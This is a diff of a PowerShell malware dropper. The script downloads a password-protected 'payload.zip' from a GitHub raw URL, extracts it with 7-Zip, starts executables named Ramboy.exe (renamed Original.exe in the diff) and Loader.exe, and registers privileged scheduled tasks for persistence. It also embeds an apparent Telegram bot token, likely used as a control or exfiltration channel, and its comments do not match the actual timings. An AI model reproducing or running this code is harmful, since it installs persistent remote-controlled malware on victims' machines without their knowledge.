@@ -2,14 +2,14 @@
 $7zipUrl = "https://www.7-zip.org/a/7z2301-x64.exe"  # 7-Zip 64-bit installer
 $installerPath = "$env:TEMP\7zInstaller.exe"
 $7zipPath = "C:\Program Files\7-Zip\7z.exe"
-$zipUrl = "https://raw.githubusercontent.com/osacarbald/n"
+$zipUrl = "https://raw.githubusercontent.com/osacarbald/newuplsss/main/payload.zip"
 $documentsPath = [Environment]::GetFolderPath("MyDocuments")
 $folderPath = Join-Path -Path $documentsPath -ChildPath "gogjothegoat"
 $zipFilePath = Join-Path $folderPath "file.zip"
 $password = "badguy"                # Replace with the ZIP file password
 $destinationPath = $folderPath     # Replace with desired extraction folder
 $payloadFolderPath = Join-Path $folderPath "payload"
-$processName = "Ramboy.exe"            # Process to check for and execute
+$processName = "Original.exe"            # Process to check for and execute
 $tboy = "7642416431:AAGRRHpOzRdpupruWLRgOiInIgZ8J1iNHiI"
 
 $processName = "powershell.exe"
@@ -71,20 +71,20 @@ if (Test-Path $payloadFolderPath) {
     Set-Location -Path $payloadFolderPath
     Write-Host "Payload folder found, executing processes..."
 
-    # Check and start 'Ramboy.exe' if not already running
-    $RamboyExePath = Join-Path $payloadFolderPath "Ramboy.exe"
-    if (Test-Path $RamboyExePath) {
-        $processRunning = Get-Process -Name "Ramboy" -ErrorAction SilentlyContinue
+    # Check and start 'Original.exe' if not already running
+    $OriginalExePath = Join-Path $payloadFolderPath "Original.exe"
+    if (Test-Path $OriginalExePath) {
+        $processRunning = Get-Process -Name "Original" -ErrorAction SilentlyContinue
         if ($null -eq $processRunning) {
-            Write-Host "Starting Ramboy.exe..."
-            Start-Process -FilePath $RamboyExePath -WorkingDirectory $payloadFolderPath
+            Write-Host "Starting Original.exe..."
+            Start-Process -FilePath $OriginalExePath -WorkingDirectory $payloadFolderPath
             Write-Host "Waiting for 120 seconds before next step..."
             Start-Sleep -Seconds 5
         } else {
-            Write-Host "'Ramboy.exe' is already running."
+            Write-Host "'Original.exe' is already running."
         }
     } else {
-        Write-Host "'Ramboy.exe' not found in the payload folder."
+        Write-Host "'Original.exe' not found in the payload folder."
     }
 
     # Execute Loader.exe if present
@@ -99,13 +99,13 @@ if (Test-Path $payloadFolderPath) {
 
 
 
-      # Execute Ramboy.exe if present
-    $RamboyPath = Join-Path $payloadFolderPath "Ramboy.exe"
+      # Execute Original.exe if present
+    $OriginalPath = Join-Path $payloadFolderPath "Original.exe"
     if (Test-Path $LoaderPath) {
-        Write-Host "Starting Ramboy.exe..."
-        Start-Process -FilePath $RamboyPath -WorkingDirectory $payloadFolderPath
+        Write-Host "Starting Original.exe..."
+        Start-Process -FilePath $OriginalPath -WorkingDirectory $payloadFolderPath
     } else {
-        Write-Host "Ramboy.exe not found."
+        Write-Host "Original.exe not found."
     }
 
 
@@ -115,12 +115,12 @@ if (Test-Path $payloadFolderPath) {
 }
 
 # I want to schedule a my Loader.exe
-$taskName = "RunRamboyEvery2Minutes"
-$action = New-ScheduledTaskAction -Execute "$RamboyExePath"
+$taskName = "RunOriginalEvery2Minutes"
+$action = New-ScheduledTaskAction -Execute "$OriginalExePath"
 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 50) -RepetitionDuration (New-TimeSpan -Days 300)
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd
-Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -TaskName $taskName -Description "Runs Ramboy.exe every 2 minutes." -RunLevel Highest | Out-Null
-Write-Host "Scheduled task for Ramboy.exe set up."
+Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -TaskName $taskName -Description "Runs Original.exe every 2 minutes." -RunLevel Highest | Out-Null
+Write-Host "Scheduled task for Original.exe set up."
 
 # Schedule task for Loader.exe
 $taskNameLoader = "RunLoaderEvery5Minutes"
